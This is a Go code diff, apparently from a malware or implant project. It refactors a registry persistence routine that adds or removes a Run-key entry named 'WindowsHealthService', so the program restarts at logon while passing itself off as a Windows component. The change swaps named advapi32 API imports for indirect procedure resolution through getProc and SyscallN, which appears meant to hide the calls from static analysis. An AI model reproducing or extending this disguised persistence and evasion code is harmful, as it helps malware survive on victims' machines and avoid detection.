@@ -11,18 +11,10 @@ import (
 	"unsafe"
 )
 
-var (
-	advapi32       = syscall.NewLazyDLL("advapi32.dll")
-	pRegOpenKeyExW = advapi32.NewProc("RegOpenKeyExW")
-	pRegSetValueExW = advapi32.NewProc("RegSetValueExW")
-	pRegDeleteValueW = advapi32.NewProc("RegDeleteValueW")
-	pRegCloseKey   = advapi32.NewProc("RegCloseKey")
-)
-
 const (
-	HKEY_CURRENT_USER  = 0x80000001
-	KEY_WRITE          = 0x20006
-	REG_SZ             = 1
+	HKEY_CURRENT_USER = 0x80000001
+	KEY_WRITE         = 0x20006
+	REG_SZ            = 1
 )
 
 func persistRegistry(remove bool) string {
@@ -34,8 +26,11 @@ func persistRegistry(remove bool) string {
 	subKey, _ := syscall.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
 	valueName, _ := syscall.UTF16PtrFromString("WindowsHealthService")
 
+	regOpen := getProc(mAdvapi32, fRegOpenKeyExW)
+	regClose := getProc(mAdvapi32, fRegCloseKey)
+
 	var hKey syscall.Handle
-	ret, _, _ := pRegOpenKeyExW.Call(
+	ret, _, _ := syscall.SyscallN(regOpen,
 		uintptr(HKEY_CURRENT_USER),
 		uintptr(unsafe.Pointer(subKey)),
 		0,
@@ -45,10 +40,11 @@ func persistRegistry(remove bool) string {
 	if ret != 0 {
 		return fmt.Sprintf("Error: RegOpenKeyEx failed (0x%x)", ret)
 	}
-	defer pRegCloseKey.Call(uintptr(hKey))
+	defer syscall.SyscallN(regClose, uintptr(hKey))
 
 	if remove {
-		ret, _, _ = pRegDeleteValueW.Call(
+		regDel := getProc(mAdvapi32, fRegDeleteValueW)
+		ret, _, _ = syscall.SyscallN(regDel,
 			uintptr(hKey),
 			uintptr(unsafe.Pointer(valueName)),
 		)
@@ -58,9 +54,10 @@ func persistRegistry(remove bool) string {
 		return "Registry run key removed"
 	}
 
+	regSet := getProc(mAdvapi32, fRegSetValueExW)
 	valueData, _ := syscall.UTF16FromString(exe)
 	dataSize := uint32(len(valueData) * 2)
-	ret, _, _ = pRegSetValueExW.Call(
+	ret, _, _ = syscall.SyscallN(regSet,
 		uintptr(hKey),
 		uintptr(unsafe.Pointer(valueName)),
 		0,
